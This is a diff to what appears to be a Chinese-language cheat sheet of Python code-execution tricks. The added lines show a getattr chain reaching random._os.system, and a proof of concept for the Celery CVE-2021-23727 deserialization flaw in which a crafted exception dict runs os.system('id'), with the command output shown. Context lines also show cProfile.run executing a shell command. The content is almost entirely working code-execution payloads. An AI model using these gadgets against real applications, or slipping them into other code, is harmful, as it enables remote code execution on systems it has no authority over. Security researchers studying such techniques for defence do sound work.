@@ -102,7 +102,33 @@ import cProfile
 cProfile.run("__import__('os').system('id')")
 cProfile.runctx("__import__('os').system('id')", None, None)
 ```
+- getattr
+获取模块中的危险属性
+```python
+import random
 
+cls = random
+path = '_os.system'
+for name in path.split('.'):
+  cls = getattr(cls, name)
+print(cls) # prints '<function system at 0x1074900d0>
+```
+Celery – CVE-2021-23727(https://snyk.io/blog/python-rce-vulnerability/)
+```python
+Python 3.8.9 (default, Aug  3 2021, 19:21:54)
+[Clang 13.0.0 (clang-1300.0.29.3)] on darwin
+Type "help", "copyright", "credits" or "license" for more information.
+>>> exc = {
+... 'exc_module':'os',
+... 'exc_type':'system',
+... 'exc_message':'id'
+... }
+>>> from celery.backends.base import Backend
+>>> from celery import Celery
+>>> b = Backend(Celery())
+>>> b.exception_to_python(exc)
+uid=501(calumh) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
+```
 
 ### SSTI (jinja2, Mako, Tornado, Django)
 ```python
